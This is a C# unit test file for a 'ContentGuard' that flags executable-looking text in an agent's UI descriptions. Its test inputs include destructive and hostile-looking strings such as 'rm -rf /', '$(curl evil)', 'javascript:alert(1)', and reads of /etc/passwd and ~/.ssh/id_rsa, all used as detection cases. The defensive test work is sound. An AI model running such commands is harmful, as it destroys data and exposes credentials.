using MapCue.Application.Agent;

namespace MapCue.Application.Tests.Agent;

public class ContentGuardTests
{
    [Theory]
    [InlineData("Open accounts")]
    [InlineData("Return to the previous screen")]
    [InlineData("Settings / Accounts tab")]
    [InlineData("Investments tab is visible only for investors")]
    [InlineData("Shows the balance: 1 234,00 zł")]
    [InlineData("Przejdź do ustawień")]
    [InlineData("A/B test banner")]
    [InlineData(null)]
    public void Plain_sentences_pass(string? text)
    {
        Assert.Null(ContentGuard.Find(text));
    }

    [Theory]
    [InlineData("- tapOn: Delete", "yaml")]
    [InlineData("appId: com.example", "yaml")]
    [InlineData("then runScript: wipe.js", "yaml")]
    [InlineData("{ id: delete }", "yaml")]
    [InlineData("---", "yaml")]
    [InlineData("see https://example.com", "url")]
    [InlineData("www.example.com/help", "url")]
    [InlineData("javascript:alert(1)", "url")]
    [InlineData("run `rm -rf /`", "command")]
    [InlineData("$(curl evil)", "command")]
    [InlineData("adb shell input tap 1 1", "command")]
    [InlineData("sudo reboot", "command")]
    [InlineData("a && b", "command")]
    [InlineData("read /etc/passwd", "path")]
    [InlineData("open ~/.ssh/id_rsa", "path")]
    [InlineData("../../secrets", "path")]
    [InlineData("C:\\Windows\\system32", "path")]
    public void Executable_looking_text_is_found(string text, string rule)
    {
        Assert.Equal(rule, ContentGuard.Find(text));
    }
}
